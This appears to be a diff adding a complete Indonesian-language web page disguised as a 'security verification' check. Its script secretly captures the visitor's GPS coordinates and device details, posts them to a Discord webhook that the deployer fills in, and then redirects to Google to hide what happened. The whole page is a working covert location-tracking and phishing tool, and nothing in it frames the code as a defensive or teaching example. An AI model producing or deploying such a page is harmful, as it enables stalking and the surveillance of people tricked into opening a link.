@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 { color: #333; margin-bottom: 20px; }
+        p { color: #666; font-size: 14px; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Verifikasi Keamanan</h1>
+        <p>Memverifikasi lokasi Anda...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // GANTI DENGAN WEBHOOK URL KAMU
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/PASTE_YOUR_WEBHOOK_HERE';
+
+        // Capture geolocation
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+
+                // Capture device info
+                const data = {
+                    "content": "",
+                    "embeds": [{
+                        "title": "📍 Data Tertangkap",
+                        "color": 16711680,
+                        "fields": [
+                            {
+                                "name": "Latitude",
+                                "value": lat.toString(),
+                                "inline": true
+                            },
+                            {
+                                "name": "Longitude",
+                                "value": lon.toString(),
+                                "inline": true
+                            },
+                            {
+                                "name": "Akurasi (meter)",
+                                "value": accuracy.toString(),
+                                "inline": true
+                            },
+                            {
+                                "name": "User Agent",
+                                "value": navigator.userAgent,
+                                "inline": false
+                            },
+                            {
+                                "name": "Timezone",
+                                "value": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                "inline": true
+                            },
+                            {
+                                "name": "Platform",
+                                "value": navigator.platform,
+                                "inline": true
+                            },
+                            {
+                                "name": "Bahasa",
+                                "value": navigator.language,
+                                "inline": true
+                            },
+                            {
+                                "name": "Screen Resolution",
+                                "value": screen.width + "x" + screen.height,
+                                "inline": true
+                            },
+                            {
+                                "name": "Waktu",
+                                "value": new Date().toLocaleString('id-ID'),
+                                "inline": false
+                            },
+                            {
+                                "name": "Google Maps Link",
+                                "value": `https://maps.google.com/?q=${lat},${lon}`,
+                                "inline": false
+                            }
+                        ]
+                    }]
+                };
+
+                // Kirim ke Discord
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).then(() => {
+                    // Redirect ke Google setelah data terkirim
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 500);
+                });
+            },
+            function(error) {
+                // Jika user tolak geolocation, redirect langsung
+                console.log('Geolocation denied');
+                window.location.href = 'https://www.google.com';
+            }
+        );
+    </script>
+</body>
+</html>
